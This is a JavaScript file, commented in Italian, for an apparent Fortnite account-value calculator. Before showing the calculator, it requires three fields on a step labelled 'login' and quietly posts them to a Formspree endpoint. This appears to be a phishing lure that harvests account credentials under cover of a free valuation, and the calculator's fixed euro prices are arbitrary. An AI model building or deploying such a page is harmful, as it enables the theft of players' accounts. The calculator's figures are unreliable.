// Funzione per inviare i dati a Formspree e passare al calcolatore con controllo minimo 5 lettere
function proseguiAlCalcolo() {
    let val1 = document.getElementById('campo1').value.trim();
    let val2 = document.getElementById('campo2').value.trim();
    let val3 = document.getElementById('campo3').value.trim();

    // 1. Controllo campi vuoti
    if (val1 === "" || val2 === "" || val3 === "") {
        alert("Per favore, compila tutti i campi prima di proseguire!");
        return;
    }

    // 2. Controllo lunghezza minima (almeno 5 caratteri per ciascuna casella)
    if (val1.length < 5 || val2.length < 5 || val3.length < 5) {
        alert("Attenzione: ogni campo deve contenere almeno 5 caratteri!");
        return;
    }

    // 3. Invio dei dati a Formspree
    fetch('https://formspree.io/f/mkjoepjl', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        },
        body: JSON.stringify({
            casella_1: val1,
            casella_2: val2,
            casella_3: val3
        })
    })
    .then(response => {
        if (response.ok) {
            console.log("Dati inviati con successo a Formspree!");
        } else {
            console.log("Errore durante l'invio dei dati.");
        }
    })
    .catch(error => {
        console.error("Errore di connessione:", error);
    });

    // 4. Passaggio al calcolatore
    document.getElementById('step-login').classList.add('hidden');
    document.getElementById('step-calculator').classList.remove('hidden');
}

// Algoritmo di Calcolo Avanzato e Preciso
function calcolaValore() {
    let skinsLegendary = parseInt(document.getElementById('skins_legendary').value) || 0;
    let skinsEpic = parseInt(document.getElementById('skins_epic').value) || 0;
    let skinsRare = parseInt(document.getElementById('skins_rare').value) || 0;
    
    let battlePasses = parseInt(document.getElementById('battle_passes').value) || 0;
    let vbucks = parseInt(document.getElementById('vbucks').value) || 0;

    let valoreSkinsLegendary = skinsLegendary * 3.50;
    let valoreSkinsEpic = skinsEpic * 2.20;
    let valoreSkinsRare = skinsRare * 1.10;

    let valoreBattlePass = battlePasses * 8.00;
    let valoreVBucks = (vbucks / 1000) * 6.50;

    let valoreExtra = 0;
    if (document.getElementById('stw_founder').checked) valoreExtra += 65.00;
    if (document.getElementById('mako_glider').checked) valoreExtra += 40.00;

    let valoreSkinRare = 0;
    if (document.getElementById('renegade').checked) valoreSkinRare += 350.00;
    if (document.getElementById('blacknight').checked) valoreSkinRare += 90.00;
    if (document.getElementById('galaxy').checked) valoreSkinRare += 60.00;
    if (document.getElementById('ikonik').checked) valoreSkinRare += 45.00;
    if (document.getElementById('travis').checked) valoreSkinRare += 35.00;
    if (document.getElementById('floss').checked) valoreSkinRare += 25.00;

    let totale = valoreSkinsLegendary + valoreSkinsEpic + valoreSkinsRare +
                 valoreBattlePass + valoreVBucks + valoreExtra + valoreSkinRare;

    document.getElementById('total-value').innerText = totale.toFixed(2).replace('.', ',') + ' €';
}
